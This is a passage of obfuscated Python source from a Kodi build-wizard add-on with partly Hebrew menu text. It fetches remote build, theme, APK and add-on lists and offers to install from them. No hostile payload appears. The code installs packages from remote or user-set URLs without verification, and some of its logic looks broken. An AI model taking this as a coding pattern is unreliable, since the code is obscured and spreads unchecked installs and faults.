	if not OOO000OOO00OOO0OO ==True :#line:2201
		addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:2202
		addDir ('כניסה לשמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME3 )#line:2203
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2204
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',icon =ICONBUILDS ,themeit =THEME3 )#line:2205
		addFile ('%s'%OOO000OOO00OOO0OO ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2206
	else :#line:2207
		O0OO0OO000OOO0OO0 ,O0O0O0000000000O0 ,OO0O00OOO000OO00O ,OOO00OOO0O00000O0 ,O0OOO0O00O0OOO0OO ,O000OO000OOOOO00O ,OO0OOOO00OOO0000O =wiz .buildCount ()#line:2208
		O0000O00000000OO0 =False ;O00000OO0OO00O0OO =[]#line:2209
		if THIRDPARTY =='true':#line:2210
			if not THIRD1NAME ==''and not THIRD1URL =='':O0000O00000000OO0 =True ;O00000OO0OO00O0OO .append ('1')#line:2211
			if not THIRD2NAME ==''and not THIRD2URL =='':O0000O00000000OO0 =True ;O00000OO0OO00O0OO .append ('2')#line:2212
			if not THIRD3NAME ==''and not THIRD3URL =='':O0000O00000000OO0 =True ;O00000OO0OO00O0OO .append ('3')#line:2213
		OOOOO00O0O0O00O0O =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"').replace ('adult=""','adult="no"')#line:2214
		OOO0O00O0OO0OOO00 =re .compile ('name="(.+?)".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OOOOO00O0O0O00O0O )#line:2215
		if O0OO0OO000OOO0OO0 ==1 and O0000O00000000OO0 ==False :#line:2216
			for OO0O00O0O0OOOO000 ,OO000OOO00OOOOOO0 ,OO0000O000OO0O0O0 ,O0OOO0O000OO000O0 ,O0OOOOO00000OOO0O ,O00O0000OOO00O0OO ,OO00OO00O0O000000 ,O0O0OOOO0O00000OO ,OOOO00OOO00O0O000 ,OOO0O00OOO0O00O00 in OOO0O00O0OO0OOO00 :#line:2217
				if not SHOWADULT =='true'and OOOO00OOO00O0O000 .lower ()=='yes':continue #line:2218
				if not DEVELOPER =='true'and wiz .strTest (OO0O00O0O0OOOO000 ):continue #line:2219
				viewBuild (OOO0O00O0OO0OOO00 [0 ][0 ])#line:2220
				return #line:2221
		addFile ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:2224
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2225
		if O0000O00000000OO0 ==True :#line:2226
			for OOO000O0O0OOO000O in O00000OO0OO00O0OO :#line:2227
				OO0O00O0O0OOOO000 =eval ('THIRD%sNAME'%OOO000O0O0OOO000O )#line:2228
		if len (OOO0O00O0OO0OOO00 )>=1 :#line:2230
			if SEPERATE =='true':#line:2231
				for OO0O00O0O0OOOO000 ,OO000OOO00OOOOOO0 ,OO0000O000OO0O0O0 ,O0OOO0O000OO000O0 ,O0OOOOO00000OOO0O ,O00O0000OOO00O0OO ,OO00OO00O0O000000 ,O0O0OOOO0O00000OO ,OOOO00OOO00O0O000 ,OOO0O00OOO0O00O00 in OOO0O00O0OO0OOO00 :#line:2232
					if not SHOWADULT =='true'and OOOO00OOO00O0O000 .lower ()=='yes':continue #line:2233
					if not DEVELOPER =='true'and wiz .strTest (OO0O00O0O0OOOO000 ):continue #line:2234
					OO0OOO0OO000OOOO0 =createMenu ('install','',OO0O00O0O0OOOO000 )#line:2235
					addDir ('[%s] %s (v%s)'%(float (O0OOOOO00000OOO0O ),OO0O00O0O0OOOO000 ,OO000OOO00OOOOOO0 ),'viewbuild',OO0O00O0O0OOOO000 ,description =OOO0O00OOO0O00O00 ,fanart =O0O0OOOO0O00000OO ,icon =OO00OO00O0O000000 ,menu =OO0OOO0OO000OOOO0 ,themeit =THEME2 )#line:2236
			else :#line:2237
				if OOO00OOO0O00000O0 >0 :#line:2238
					O0OO0OO0O0O0OOO0O ='+'if SHOW17 =='false'else '-'#line:2239
					if SHOW17 =='true':#line:2241
						for OO0O00O0O0OOOO000 ,OO000OOO00OOOOOO0 ,OO0000O000OO0O0O0 ,O0OOO0O000OO000O0 ,O0OOOOO00000OOO0O ,O00O0000OOO00O0OO ,OO00OO00O0O000000 ,O0O0OOOO0O00000OO ,OOOO00OOO00O0O000 ,OOO0O00OOO0O00O00 in OOO0O00O0OO0OOO00 :#line:2243
							if not SHOWADULT =='true'and OOOO00OOO00O0O000 .lower ()=='yes':continue #line:2244
							if not DEVELOPER =='true'and wiz .strTest (OO0O00O0O0OOOO000 ):continue #line:2245
							OOOOO0O0O0OO0OO0O =int (float (O0OOOOO00000OOO0O ))#line:2246
							if OOOOO0O0O0OO0OO0O ==17 :#line:2247
								OO0OOO0OO000OOOO0 =createMenu ('install','',OO0O00O0O0OOOO000 )#line:2248
								addDir ('[%s] %s (v%s)'%(float (O0OOOOO00000OOO0O ),OO0O00O0O0OOOO000 ,OO000OOO00OOOOOO0 ),'viewbuild',OO0O00O0O0OOOO000 ,description =OOO0O00OOO0O00O00 ,fanart =O0O0OOOO0O00000OO ,icon =OO00OO00O0O000000 ,menu =OO0OOO0OO000OOOO0 ,themeit =THEME2 )#line:2249
				if O0OOO0O00O0OOO0OO >0 :#line:2250
					O0OO0OO0O0O0OOO0O ='+'if SHOW18 =='false'else '-'#line:2251
					if SHOW18 =='true':#line:2253
						for OO0O00O0O0OOOO000 ,OO000OOO00OOOOOO0 ,OO0000O000OO0O0O0 ,O0OOO0O000OO000O0 ,O0OOOOO00000OOO0O ,O00O0000OOO00O0OO ,OO00OO00O0O000000 ,O0O0OOOO0O00000OO ,OOOO00OOO00O0O000 ,OOO0O00OOO0O00O00 in OOO0O00O0OO0OOO00 :#line:2255
							if not SHOWADULT =='true'and OOOO00OOO00O0O000 .lower ()=='yes':continue #line:2256
							if not DEVELOPER =='true'and wiz .strTest (OO0O00O0O0OOOO000 ):continue #line:2257
							OOOOO0O0O0OO0OO0O =int (float (O0OOOOO00000OOO0O ))#line:2258
							if OOOOO0O0O0OO0OO0O ==18 :#line:2259
								OO0OOO0OO000OOOO0 =createMenu ('install','',OO0O00O0O0OOOO000 )#line:2260
								addDir ('[%s] %s (v%s)'%(float (O0OOOOO00000OOO0O ),OO0O00O0O0OOOO000 ,OO000OOO00OOOOOO0 ),'viewbuild',OO0O00O0O0OOOO000 ,description =OOO0O00OOO0O00O00 ,fanart =O0O0OOOO0O00000OO ,icon =OO00OO00O0O000000 ,menu =OO0OOO0OO000OOOO0 ,themeit =THEME2 )#line:2261
				if OO0O00OOO000OO00O >0 :#line:2262
					O0OO0OO0O0O0OOO0O ='+'if SHOW16 =='false'else '-'#line:2263
					addFile ('[B]%s Jarvis Builds(%s)[/B]'%(O0OO0OO0O0O0OOO0O ,OO0O00OOO000OO00O ),'togglesetting','show16',themeit =THEME3 )#line:2264
					if SHOW16 =='true':#line:2265
						for OO0O00O0O0OOOO000 ,OO000OOO00OOOOOO0 ,OO0000O000OO0O0O0 ,O0OOO0O000OO000O0 ,O0OOOOO00000OOO0O ,O00O0000OOO00O0OO ,OO00OO00O0O000000 ,O0O0OOOO0O00000OO ,OOOO00OOO00O0O000 ,OOO0O00OOO0O00O00 in OOO0O00O0OO0OOO00 :#line:2266
							if not SHOWADULT =='true'and OOOO00OOO00O0O000 .lower ()=='yes':continue #line:2267
							if not DEVELOPER =='true'and wiz .strTest (OO0O00O0O0OOOO000 ):continue #line:2268
							OOOOO0O0O0OO0OO0O =int (float (O0OOOOO00000OOO0O ))#line:2269
							if OOOOO0O0O0OO0OO0O ==16 :#line:2270
								OO0OOO0OO000OOOO0 =createMenu ('install','',OO0O00O0O0OOOO000 )#line:2271
								addDir ('[%s] %s (v%s)'%(float (O0OOOOO00000OOO0O ),OO0O00O0O0OOOO000 ,OO000OOO00OOOOOO0 ),'viewbuild',OO0O00O0O0OOOO000 ,description =OOO0O00OOO0O00O00 ,fanart =O0O0OOOO0O00000OO ,icon =OO00OO00O0O000000 ,menu =OO0OOO0OO000OOOO0 ,themeit =THEME2 )#line:2272
				if O0O0O0000000000O0 >0 :#line:2273
					O0OO0OO0O0O0OOO0O ='+'if SHOW15 =='false'else '-'#line:2274
					addFile ('[B]%s Isengard and Below Builds(%s)[/B]'%(O0OO0OO0O0O0OOO0O ,O0O0O0000000000O0 ),'togglesetting','show15',themeit =THEME3 )#line:2275
					if SHOW15 =='true':#line:2276
						for OO0O00O0O0OOOO000 ,OO000OOO00OOOOOO0 ,OO0000O000OO0O0O0 ,O0OOO0O000OO000O0 ,O0OOOOO00000OOO0O ,O00O0000OOO00O0OO ,OO00OO00O0O000000 ,O0O0OOOO0O00000OO ,OOOO00OOO00O0O000 ,OOO0O00OOO0O00O00 in OOO0O00O0OO0OOO00 :#line:2277
							if not SHOWADULT =='true'and OOOO00OOO00O0O000 .lower ()=='yes':continue #line:2278
							if not DEVELOPER =='true'and wiz .strTest (OO0O00O0O0OOOO000 ):continue #line:2279
							OOOOO0O0O0OO0OO0O =int (float (O0OOOOO00000OOO0O ))#line:2280
							if OOOOO0O0O0OO0OO0O <=15 :#line:2281
								OO0OOO0OO000OOOO0 =createMenu ('install','',OO0O00O0O0OOOO000 )#line:2282
								addDir ('[%s] %s (v%s)'%(float (O0OOOOO00000OOO0O ),OO0O00O0O0OOOO000 ,OO000OOO00OOOOOO0 ),'viewbuild',OO0O00O0O0OOOO000 ,description =OOO0O00OOO0O00O00 ,fanart =O0O0OOOO0O00000OO ,icon =OO00OO00O0O000000 ,menu =OO0OOO0OO000OOOO0 ,themeit =THEME2 )#line:2283
		elif OO0OOOO00OOO0000O >0 :#line:2284
			if O000OO000OOOOO00O >0 :#line:2285
				addFile ('There is currently only Adult builds','',icon =ICONBUILDS ,themeit =THEME3 )#line:2286
				addFile ('Enable Show Adults in Addon Settings > Misc','',icon =ICONBUILDS ,themeit =THEME3 )#line:2287
			else :#line:2288
				addFile ('Currently No Builds Offered from %s'%ADDONTITLE ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2289
		else :addFile ('Text file for builds not formated correctly.','',icon =ICONBUILDS ,themeit =THEME3 )#line:2290
	setView ('files','viewType')#line:2291
def viewBuild (OO000O00000OOOOOO ):#line:2293
	O0O000O0000O00000 =wiz .workingURL (SPEEDFILE )#line:2294
	if not O0O000O0000O00000 ==True :#line:2295
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',themeit =THEME3 )#line:2296
		addFile ('%s'%O0O000O0000O00000 ,'',themeit =THEME3 )#line:2297
		return #line:2298
	if wiz .checkBuild (OO000O00000OOOOOO ,'version')==False :#line:2299
		addFile ('Error reading the txt file.','',themeit =THEME3 )#line:2300
		addFile ('%s was not found in the builds list.'%OO000O00000OOOOOO ,'',themeit =THEME3 )#line:2301
		return #line:2302
	O0O0O0OO00OOOO0OO =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"')#line:2303
	OOOOOO000OO0OOO00 =re .compile ('name="%s".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?review="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%OO000O00000OOOOOO ).findall (O0O0O0OO00OOOO0OO )#line:2304
	for OO0OO0O0O000O0000 ,O00OOO0O0O0O0O0OO ,O0000OOO0O0O0O0O0 ,O00O0O0OOO00OO0O0 ,O00OOOOOO00OO0OO0 ,O0OO00OO0OO0O0OO0 ,OOO000O0OO0O0O000 ,O00OOOO00O0OO0OOO ,O0OOOOOO0O0O0OO00 ,OO00OOOO00OO0OOOO in OOOOOO000OO0OOO00 :#line:2305
		O0OO00OO0OO0O0OO0 =O0OO00OO0OO0O0OO0 if wiz .workingURL (O0OO00OO0OO0O0OO0 )else ICON #line:2306
		OOO000O0OO0O0O000 =OOO000O0OO0O0O000 if wiz .workingURL (OOO000O0OO0O0O000 )else FANART #line:2307
		OO00OOO00OO00O000 ='%s (v%s)'%(OO000O00000OOOOOO ,OO0OO0O0O000O0000 )#line:2308
		if BUILDNAME ==OO000O00000OOOOOO and OO0OO0O0O000O0000 >BUILDVERSION :#line:2309
			OO00OOO00OO00O000 ='%s [COLOR red][CURRENT v%s][/COLOR]'%(OO00OOO00OO00O000 ,BUILDVERSION )#line:2310
		OO000O000O0O0O0O0 =int (float (KODIV ));OOOOO00O000OO0OOO =int (float (O00O0O0OOO00OO0O0 ))#line:2319
		if not OO000O000O0O0O0O0 ==OOOOO00O000OO0OOO :#line:2320
			if OO000O000O0O0O0O0 ==16 and OOOOO00O000OO0OOO <=15 :OO0O0000OO00OO0O0 =False #line:2321
			else :OO0O0000OO00OO0O0 =True #line:2322
		else :OO0O0000OO00OO0O0 =False #line:2323
		addFile ('התקנה','install',OO000O00000OOOOOO ,'fresh',description =OO00OOOO00OO0OOOO ,fanart =OOO000O0OO0O0O000 ,icon =O0OO00OO0OO0O0OO0 ,themeit =THEME1 )#line:2327
		if not O00OOOOOO00OO0OO0 =='http://':#line:2330
			if wiz .workingURL (O00OOOOOO00OO0OO0 )==True :#line:2331
				addFile (wiz .sep ('THEMES'),'',fanart =OOO000O0OO0O0O000 ,icon =O0OO00OO0OO0O0OO0 ,themeit =THEME3 )#line:2332
				O0O0O0OO00OOOO0OO =wiz .openURL (O00OOOOOO00OO0OO0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2333
				OOOOOO000OO0OOO00 =re .compile ('name="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O0O0O0OO00OOOO0OO )#line:2334
				for OOOO0OO0O000O0OO0 ,OOO0O00000OO00OOO ,O0OO000O00000O000 ,OO0OOO0OO00O0000O ,O0OOO000OO000O000 ,OO00OOOO00OO0OOOO in OOOOOO000OO0OOO00 :#line:2335
					if not SHOWADULT =='true'and O0OOO000OO000O000 .lower ()=='yes':continue #line:2336
					O0OO000O00000O000 =O0OO000O00000O000 if O0OO000O00000O000 =='http://'else O0OO00OO0OO0O0OO0 #line:2337
					OO0OOO0OO00O0000O =OO0OOO0OO00O0000O if OO0OOO0OO00O0000O =='http://'else OOO000O0OO0O0O000 #line:2338
					addFile (OOOO0OO0O000O0OO0 if not OOOO0OO0O000O0OO0 ==BUILDTHEME else "[B]%s (Installed)[/B]"%OOOO0OO0O000O0OO0 ,'theme',OO000O00000OOOOOO ,OOOO0OO0O000O0OO0 ,description =OO00OOOO00OO0OOOO ,fanart =OO0OOO0OO00O0000O ,icon =O0OO000O00000O000 ,themeit =THEME3 )#line:2339
	setView ('files','viewType')#line:2340
def viewThirdList (OOO0000OO00OOO00O ):#line:2342
	O00OOO0O0O00000O0 =eval ('THIRD%sNAME'%OOO0000OO00OOO00O )#line:2343
	O00OOOO0O0OOO00O0 =eval ('THIRD%sURL'%OOO0000OO00OOO00O )#line:2344
	OOO0OO0OO00O00000 =wiz .workingURL (O00OOOO0O0OOO00O0 )#line:2345
	if not OOO0OO0OO00O00000 ==True :#line:2346
		addFile ('Url for txt file not valid','',icon =ICONBUILDS ,themeit =THEME3 )#line:2347
		addFile ('%s'%WORKINGURL ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2348
	else :#line:2349
		O0O0O0000OO0OOOO0 ,OOO0O0OO0O0OOO000 =wiz .thirdParty (O00OOOO0O0OOO00O0 )#line:2350
		addFile ("[B]%s[/B]"%O00OOO0O0O00000O0 ,'',themeit =THEME3 )#line:2351
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2352
		if O0O0O0000OO0OOOO0 :#line:2353
			for O00OOO0O0O00000O0 ,O0O00O00O000O0O00 ,O00OOOO0O0OOO00O0 ,O0O00OO0000OO0OO0 ,OOOO0OOO0O000OOOO ,OO0O00OOOO00O0OOO ,O000O0O00OO0O0O0O ,O0O00O00OO00OO00O in OOO0O0OO0O0OOO000 :#line:2354
				if not SHOWADULT =='true'and O000O0O00OO0O0O0O .lower ()=='yes':continue #line:2355
				addFile ("[%s] %s v%s"%(O0O00OO0000OO0OO0 ,O00OOO0O0O00000O0 ,O0O00O00O000O0O00 ),'installthird',O00OOO0O0O00000O0 ,O00OOOO0O0OOO00O0 ,icon =OOOO0OOO0O000OOOO ,fanart =OO0O00OOOO00O0OOO ,description =O0O00O00OO00OO00O ,themeit =THEME2 )#line:2356
		else :#line:2357
			for O00OOO0O0O00000O0 ,O00OOOO0O0OOO00O0 ,OOOO0OOO0O000OOOO ,OO0O00OOOO00O0OOO ,O0O00O00OO00OO00O in OOO0O0OO0O0OOO000 :#line:2358
				addFile (O00OOO0O0O00000O0 ,'installthird',O00OOO0O0O00000O0 ,O00OOOO0O0OOO00O0 ,icon =OOOO0OOO0O000OOOO ,fanart =OO0O00OOOO00O0OOO ,description =O0O00O00OO00OO00O ,themeit =THEME2 )#line:2359
def editThirdParty (O00OO00OOOO00O0O0 ):#line:2361
	O0O000000000O0O0O =eval ('THIRD%sNAME'%O00OO00OOOO00O0O0 )#line:2362
	O0O000OO0O0O00OO0 =eval ('THIRD%sURL'%O00OO00OOOO00O0O0 )#line:2363
	O00000O0OOO0O0000 =wiz .getKeyboard (O0O000000000O0O0O ,'Enter the Name of the Wizard')#line:2364
	OO0O0OOO00OOO0000 =wiz .getKeyboard (O0O000OO0O0O00OO0 ,'Enter the URL of the Wizard Text')#line:2365
	wiz .setS ('wizard%sname'%O00OO00OOOO00O0O0 ,O00000O0OOO0O0000 )#line:2367
	wiz .setS ('wizard%surl'%O00OO00OOOO00O0O0 ,OO0O0OOO00OOO0000 )#line:2368
def apkScraper (name =""):#line:2370
	if name =='kodi':#line:2371
		OOO00OOOOOOOO0OOO ='http://mirrors.kodi.tv/releases/android/arm/'#line:2372
		OOO0O000OO0OOOO00 ='http://mirrors.kodi.tv/releases/android/arm/old/'#line:2373
		OOOO000OO00OOOO0O =wiz .openURL (OOO00OOOOOOOO0OOO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2374
		OO0OO00OO000O000O =wiz .openURL (OOO0O000OO0OOOO00 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2375
		OOOOOOOOOO000O00O =0 #line:2376
		O00OO0OOOOOOO0O0O =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (OOOO000OO00OOOO0O )#line:2377
		OO00O0OOO0OO0O00O =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (OO0OO00OO000O000O )#line:2378
		addFile ("Official Kodi Apk\'s",themeit =THEME1 )#line:2380
		OOO00O0000000O000 =False #line:2381
		for OOO0O000O000O0O0O ,name ,OO00OO0OOOO000OO0 ,OOO00000O00000000 in O00OO0OOOOOOO0O0O :#line:2382
			if OOO0O000O000O0O0O in ['../','old/']:continue #line:2383
			if not OOO0O000O000O0O0O .endswith ('.apk'):continue #line:2384
			if not OOO0O000O000O0O0O .find ('_')==-1 and OOO00O0000000O000 ==True :continue #line:2385
			try :#line:2386
				O00O0O000OO00O00O =name .split ('-')#line:2387
				if not OOO0O000O000O0O0O .find ('_')==-1 :#line:2388
					OOO00O0000000O000 =True #line:2389
					O000OOO00000O0O00 ,OO00OO000OO00OOO0 =O00O0O000OO00O00O [2 ].split ('_')#line:2390
				else :#line:2391
					O000OOO00000O0O00 =O00O0O000OO00O00O [2 ]#line:2392
					OO00OO000OO00OOO0 =''#line:2393
				OOOO000O0O0O0O0O0 ="[COLOR %s]%s v%s%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,O00O0O000OO00O00O [0 ].title (),O00O0O000OO00O00O [1 ],OO00OO000OO00OOO0 .upper (),O000OOO00000O0O00 ,COLOR2 ,OO00OO0OOOO000OO0 .replace (' ',''),COLOR1 ,OOO00000O00000000 )#line:2394
				OO0O0OOOOOO000OOO =urljoin (OOO00OOOOOOOO0OOO ,OOO0O000O000O0O0O )#line:2395
				addFile (OOOO000O0O0O0O0O0 ,'apkinstall',"%s v%s%s %s"%(O00O0O000OO00O00O [0 ].title (),O00O0O000OO00O00O [1 ],OO00OO000OO00OOO0 .upper (),O000OOO00000O0O00 ),OO0O0OOOOOO000OOO )#line:2396
				OOOOOOOOOO000O00O +=1 #line:2397
			except :#line:2398
				wiz .log ("Error on: %s"%name )#line:2399
		for OOO0O000O000O0O0O ,name ,OO00OO0OOOO000OO0 ,OOO00000O00000000 in OO00O0OOO0OO0O00O :#line:2401
			if OOO0O000O000O0O0O in ['../','old/']:continue #line:2402
			if not OOO0O000O000O0O0O .endswith ('.apk'):continue #line:2403
			if not OOO0O000O000O0O0O .find ('_')==-1 :continue #line:2404
			try :#line:2405
				O00O0O000OO00O00O =name .split ('-')#line:2406
				OOOO000O0O0O0O0O0 ="[COLOR %s]%s v%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,O00O0O000OO00O00O [0 ].title (),O00O0O000OO00O00O [1 ],O00O0O000OO00O00O [2 ],COLOR2 ,OO00OO0OOOO000OO0 .replace (' ',''),COLOR1 ,OOO00000O00000000 )#line:2407
				OO0O0OOOOOO000OOO =urljoin (OOO0O000OO0OOOO00 ,OOO0O000O000O0O0O )#line:2408
				addFile (OOOO000O0O0O0O0O0 ,'apkinstall',"%s v%s %s"%(O00O0O000OO00O00O [0 ].title (),O00O0O000OO00O00O [1 ],O00O0O000OO00O00O [2 ]),OO0O0OOOOOO000OOO )#line:2409
				OOOOOOOOOO000O00O +=1 #line:2410
			except :#line:2411
				wiz .log ("Error on: %s"%name )#line:2412
		if OOOOOOOOOO000O00O ==0 :addFile ("Error Kodi Scraper Is Currently Down.")#line:2413
	elif name =='spmc':#line:2414
		O0O00O0OO0O0O000O ='https://github.com/koying/SPMC/releases'#line:2415
		OOOO000OO00OOOO0O =wiz .openURL (O0O00O0OO0O0O000O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2416
		OOOOOOOOOO000O00O =0 #line:2417
		O00OO0OOOOOOO0O0O =re .compile ('<div.+?lass="release-body.+?div class="release-header".+?a href=.+?>(.+?)</a>.+?ul class="release-downloads">(.+?)</ul>.+?/div>').findall (OOOO000OO00OOOO0O )#line:2418
		addFile ("Official SPMC Apk\'s",themeit =THEME1 )#line:2420
		for name ,OOOO00000O0OO0OO0 in O00OO0OOOOOOO0O0O :#line:2422
			O0OOO00O000OO0OOO =''#line:2423
			OO00O0OOO0OO0O00O =re .compile ('<li>.+?<a href="(.+?)" rel="nofollow">.+?<small class="text-gray float-right">(.+?)</small>.+?strong>(.+?)</strong>.+?</a>.+?</li>').findall (OOOO00000O0OO0OO0 )#line:2424
			for OOOOO000OO0OOOOO0 ,O000O0OOOO0OO0000 ,O000OOO0OO0OOO00O in OO00O0OOO0OO0O00O :#line:2425
				if O000OOO0OO0OOO00O .find ('armeabi')==-1 :continue #line:2426
				if O000OOO0OO0OOO00O .find ('launcher')>-1 :continue #line:2427
				O0OOO00O000OO0OOO =urljoin ('https://github.com',OOOOO000OO0OOOOO0 )#line:2428
				break #line:2429
		if OOOOOOOOOO000O00O ==0 :addFile ("Error SPMC Scraper Is Currently Down.")#line:2431
def apkMenu (url =None ):#line:2433
	if url ==None :#line:2434
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2437
	if not APKFILE =='http://':#line:2438
		if url ==None :#line:2439
			OOO0000O00O0O0000 =wiz .workingURL (APKFILE )#line:2440
			O0OO0OO0000OOOOOO =uservar .APKFILE #line:2441
		else :#line:2442
			OOO0000O00O0O0000 =wiz .workingURL (url )#line:2443
			O0OO0OO0000OOOOOO =url #line:2444
		if OOO0000O00O0O0000 ==True :#line:2445
			O0000OO0O00OO000O =wiz .openURL (O0OO0OO0000OOOOOO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2446
			O0O0O0O000O00O0O0 =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O0000OO0O00OO000O )#line:2447
			if len (O0O0O0O000O00O0O0 )>0 :#line:2448
				OO0O00O00O000000O =0 #line:2449
				for O0OOOO0O0OO00OO00 ,O00OOOOO00O0O00O0 ,url ,O00O0O0O00OO0O00O ,OO00O0O0OOO0OO000 ,O00OO0OOOO0O00000 ,OO00OOO000OOO0OOO in O0O0O0O000O00O0O0 :#line:2450
					if not SHOWADULT =='true'and O00OO0OOOO0O00000 .lower ()=='yes':continue #line:2451
					if O00OOOOO00O0O00O0 .lower ()=='yes':#line:2452
						OO0O00O00O000000O +=1 #line:2453
						addDir ("[B]%s[/B]"%O0OOOO0O0OO00OO00 ,'apk',url ,description =OO00OOO000OOO0OOO ,icon =O00O0O0O00OO0O00O ,fanart =OO00O0O0OOO0OO000 ,themeit =THEME3 )#line:2454
					else :#line:2455
						OO0O00O00O000000O +=1 #line:2456
						addFile (O0OOOO0O0OO00OO00 ,'apkinstall',O0OOOO0O0OO00OO00 ,url ,description =OO00OOO000OOO0OOO ,icon =O00O0O0O00OO0O00O ,fanart =OO00O0O0OOO0OO000 ,themeit =THEME2 )#line:2457
					if OO0O00O00O000000O <1 :#line:2458
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2459
			else :wiz .log ("[APK Menu] ERROR: Invalid Format.",xbmc .LOGERROR )#line:2460
		else :#line:2461
			wiz .log ("[APK Menu] ERROR: URL for apk list not working.",xbmc .LOGERROR )#line:2462
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2463
			addFile ('%s'%OOO0000O00O0O0000 ,'',themeit =THEME3 )#line:2464
		return #line:2465
	else :wiz .log ("[APK Menu] No APK list added.")#line:2466
	setView ('files','viewType')#line:2467
def addonMenu (url =None ):#line:2469
	if not ADDONFILE =='http://':#line:2470
		if url ==None :#line:2471
			O0OO00OOO0OO0O0OO =wiz .workingURL (ADDONFILE )#line:2472
			O00O00O0OOOOO0000 =uservar .ADDONFILE #line:2473
		else :#line:2474
			O0OO00OOO0OO0O0OO =wiz .workingURL (url )#line:2475
			O00O00O0OOOOO0000 =url #line:2476
		if O0OO00OOO0OO0O0OO ==True :#line:2477
			OO0OO000OOOO00000 =wiz .openURL (O00O00O0OOOOO0000 ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2478
			O00OO0O0O00O00O0O =re .compile ('name="(.+?)".+?lugin="(.+?)".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OO0OO000OOOO00000 )#line:2479
			if len (O00OO0O0O00O00O0O )>0 :#line:2480
				OOO0O0OO000O000OO =0 #line:2481
				for OOO00OO0O0OO0O000 ,OOOO0O0O00O00O0O0 ,url ,O0OO00O00O00O0000 ,O0OOOO00000OOOO00 ,O0O00OOO0000OOO00 ,O0O0OOO0O0OO0OO0O ,OO0OO00O00O0OO0OO ,O00OO00000OOOO000 ,OOOO0000OO000OOOO in O00OO0O0O00O00O0O :#line:2482
					if OOOO0O0O00O00O0O0 .lower ()=='section':#line:2483
						OOO0O0OO000O000OO +=1 #line:2484
						addDir ("[B]%s[/B]"%OOO00OO0O0OO0O000 ,'addons',url ,description =OOOO0000OO000OOOO ,icon =O0O0OOO0O0OO0OO0O ,fanart =OO0OO00O00O0OO0OO ,themeit =THEME3 )#line:2485
					else :#line:2486
						if not SHOWADULT =='true'and O00OO00000OOOO000 .lower ()=='yes':continue #line:2487
						try :#line:2488
							OOO0OO00OO0OOOOOO =xbmcaddon .Addon (id =OOOO0O0O00O00O0O0 ).getAddonInfo ('path')#line:2489
							if os .path .exists (OOO0OO00OO0OOOOOO ):#line:2490
								OOO00OO0O0OO0O000 ="[COLOR green][Installed][/COLOR] %s"%OOO00OO0O0OO0O000 #line:2491
						except :#line:2492
							pass #line:2493
						OOO0O0OO000O000OO +=1 #line:2494
						addFile (OOO00OO0O0OO0O000 ,'addoninstall',OOOO0O0O00O00O0O0 ,O00O00O0OOOOO0000 ,description =OOOO0000OO000OOOO ,icon =O0O0OOO0O0OO0OO0O ,fanart =OO0OO00O00O0OO0OO ,themeit =THEME2 )#line:2495
					if OOO0O0OO000O000OO <1 :#line:2496
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2497
			else :#line:2498
				addFile ('Text File not formated correctly!','',themeit =THEME3 )#line:2499
				wiz .log ("[Addon Menu] ERROR: Invalid Format.")#line:2500
		else :#line:2501
			wiz .log ("[Addon Menu] ERROR: URL for Addon list not working.")#line:2502
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2503
			addFile ('%s'%O0OO00OOO0OO0O0OO ,'',themeit =THEME3 )#line:2504
	else :wiz .log ("[Addon Menu] No Addon list added.")#line:2505
	setView ('files','viewType')#line:2506
def addonInstaller (OOOOOOO00O000OOOO ,OO00O00O00OOOOOO0 ):#line:2508
	if not ADDONFILE =='http://':#line:2509
		OOO0OOO000O00000O =wiz .workingURL (OO00O00O00OOOOOO0 )#line:2510
